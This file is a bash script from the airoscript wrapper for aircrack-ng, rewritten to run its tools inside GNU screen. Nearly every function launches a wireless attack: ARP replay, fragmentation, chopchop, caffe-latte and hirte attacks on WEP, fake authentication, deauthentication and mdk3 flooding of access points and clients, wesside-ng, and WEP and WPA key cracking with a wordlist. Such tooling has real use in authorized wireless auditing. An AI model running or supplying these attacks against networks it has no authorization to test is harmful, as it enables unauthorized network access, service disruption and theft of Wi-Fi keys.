#!/bin/bash
# Functions that have been modified to work with screen.
	#Subproducts of choosescan.
	function Scan {
		clear
		rm -rf $DUMP_PATH/dump*

		$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen 
		$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI "  
	}

	function attack {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE "
			capture  & fakeauth3 & menufonction
		}
		#Option 2 (fake auth interactive)
		function fakeinteractiveattack {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X  at "*" stuff "AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE"
			capture & fakeauth3 & menufonction
		}

		#Option 3 (fragmentation attack)
		function fragnoclient {
			rm -rf fragment-*.xor
			rm -rf $DUMP_PATH/frag_*.cap
			rm -rf $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng # FIXME Is this a good idea? I think we should save pids of what we launched, and then kill them.
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X  at "*" stuff "$AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI"
			capture & fakeauth3 &  injectmenu
			}

		#Option 4 (chopchopattack)
		function chopchopattack {
			clear
			rm -rf $DUMP_PATH/$Host_MAC*
			rm -rf replay_dec-*.xor
			capture &  fakeauth3 & injectmenu
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $WIFI"
		}
		#Option 5 (caffe late attack)
		function cafelatteattack {
			capture & 
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $WIFI" & fakeauth3 & menufonction
			}

		#Option 6 (hirte attack)
		function hirteattack {
			capture &
 			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $WIFI" & fakeauth3 & menufonction
		}

		#Option 7 (Auto arp replay)
		function attackclient {
			capture & 
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY $WIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE " & menufonction
		}

		#Option 8 (interactive arp replay) 

		function interactiveattack {
			capture & 
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC $Client_MAC -x $INJECTRATE" & menufonction
		}

		#Option 9 (fragmentation attack)
		function fragmentationattack {
			rm -rf fragment-*.xor
			rm -rf $DUMP_PATH/frag_*.cap
			rm -rf $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$$AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI" & capture &  injectmenu
		}

		#Option 10 (fragmentation attack with client)
		function fragmentationattackclient {
			rm -rf fragment-*.xor
			rm -rf $DUMP_PATH/frag_*.cap
			rm -rf $DUMP_PATH/$Host_MAC*
			killall -9 airodump-ng aireplay-ng
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY -7 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI" & capture &  injectmenu
		}
		#Option 11
		function chopchopattackclient {
			clear
			rm -rf $DUMP_PATH/$Host_MAC*
			rm -rf replay_dec-*.xor
			capture & $CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY --chopchop -h $Client_MAC $WIFI" & injectmenu
		}
		#Option 12 (pskarp)
		function pskarp {
			rm -rf $DUMP_PATH/arp_*.cap
			$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
			capture & $CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI" & menufonction
		}

	# If wpa
	function wpahandshake {
		clear
		rm -rf $DUMP_PATH/$Host_MAC*
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI" & menufonction
	}

	# Those are subproducts of crack for wep.
		function crackptw   {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff " $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap" & menufonction
		}

		function crackstd   {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff " $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap" & menufonction
		}
	
		function crackman {
			echo -n "type fudge factor"
			read FUDGE_FACTOR
			echo You typed: $FUDGE_FACTOR
			set -- ${FUDGE_FACTOR}
			echo -e -n "`gettext \"type encryption size 64,128 etc...\"`"
			read ENC_SIZE
			echo You typed: $ENC_SIZE
			set -- ${ENC_SIZE}
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff " $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap" & menufonction
		}

	# This is for wpa cracking
	function wpacrack {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIRCRACKOLD $FORCEKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST" & menufonction
	}

# Those are subproducts of choosefake
	function fakeauth1 {
					$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff  "$AIREPLAY --fakeauth 6000 -o 1 -q 10 -e $Host_SSID -a $Host_MAC -h $FAKE_MAC $WIFI" & menufonction
	}
	function fakeauth2 {
					$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI" & menufonction
	}
	function fakeauth3 {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff  "$AIREPLAY --fakeauth 5 -o 10 -q 1 -e $Host_SSID -a $Host_MAC -h $FAKE_MAC $WIFI" & menufonction
	}
	
	# Subproducts of choosedeauth
		function deauthall {
						$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI"
		}
		
		function deauthclient {
		if [ "$Client_MAC" = "" ]
		then	
			clear
			echo "ERROR: You have to select a client first"
		else
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff  "$AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $WIFI"
		fi
		}
		
		function deauthfake {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff  "$AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $WIFI"
		}


# I suppose all these are part of this option(Others:7):
	# 1.
	function inject_test {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY $WIFI --test" & menufonction
	}
			function mdkpain {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff " $MDK3 $WIFI d" & choosemdk
			}
			
			function mdktargetedpain {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$MDK3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC" & choosemdk
			}

			function mdkauth {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$MDK3 $WIFI a" & choosemdk
			}
	
			function wesside {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
				$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
				$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff  "$WESSIDE -i $WIFI" & choosewesside
			}

			function wessidetarget {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff  "$WESSIDE -v $Host_MAC -i $WIFI" & choosewesside
			}

			function wessidetargetmaxer {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$EXECFLAG $WESSIDE -v $Host_MAC -k 1 -i $WIFI" & choosewesside
			}

			function wessidetargetpoor {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$WESSIDE -v $Host_MAC -k 3 -i $WIFI" & choosewesside
			}

			function wessidenewtarget {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
				ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
				head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv
				clear
				echo -e "`gettext\"        Detected Access point list\"`"
				echo ""
				echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
				echo ""
				i=0
				while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
				longueur=${#MAC}
				if [ $longueur -ge 17 ]; then
					i=$(($i+1))
					echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
					aidlenght=$IDLENGTH
					assid[$i]=$ESSID
					achannel[$i]=$CHANNEL
					amac[$i]=$MAC
					aprivacy[$i]=$PRIVACY
					aspeed[$i]=$SPEED
				fi
				
				done < $DUMP_PATH/dump-02.csv
					echo ""
					echo -e "`gettext \"       Select target               \"`"
					read choice
						idlenght=${aidlenght[$choice]}
						ssid=${assid[$choice]}
						channel=${achannel[$choice]}
						mac=${amac[$choice]}
						privacy=${aprivacy[$choice]}
						speed=${aspeed[$choice]}
						Host_IDL=$idlength
						Host_SPEED=$speed
						Host_ENC=$privacy
						Host_MAC=$mac
						Host_CHAN=$channel
						acouper=${#ssid}
						fin=$(($acouper-idlength))
						Host_SSID=${ssid:1:fin}
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$WESSIDE -v $Host_MAC -i $WIFI" & choosewesside
			}

	function fragnoclientend {
		if [ "$Host_MAC" = "" ]
		then
			clear
			echo `gettext 'ERROR: You must select a target first'`
		else
		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff " $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI" & menufonction
		fi
	}

	function fragmentationattackend {

		if [ "$Host_MAC" = "" ]
		then
			clear
			echo `gettext 'ERROR: You must select a target first' `
		else
		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff  "$AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI" & menufonction
		fi
	}

	function chopchopend {
		if [ "$Host_MAC" = "" ]
		then
			clear
			echo `gettext 'ERROR: You must select a target first' `
		else
		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap

		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI" & menufonction
		fi
	}
	
	function chopchopclientend {
		if [ "$Host_MAC" = "" ]
		then
			clear
			echo `gettext 'ERROR: You must select a target first' `
		else
		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff " $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI" & menufonction
		fi
	}


	function capture {
		rm -rf $DUMP_PATH/$Host_MAC*
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff " $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI "
	}

	function fakeauth {
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -D -RR -X screen
			$CDCMD screen -S airoscript -c /usr/share/airoscript/screenrc -X at "*" stuff "$AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI"
	}

	function menufonction {
			echo "Fake function to return to menu within screen, deleted everyting since this part should not be seen by user)"
			clear	
	}
	
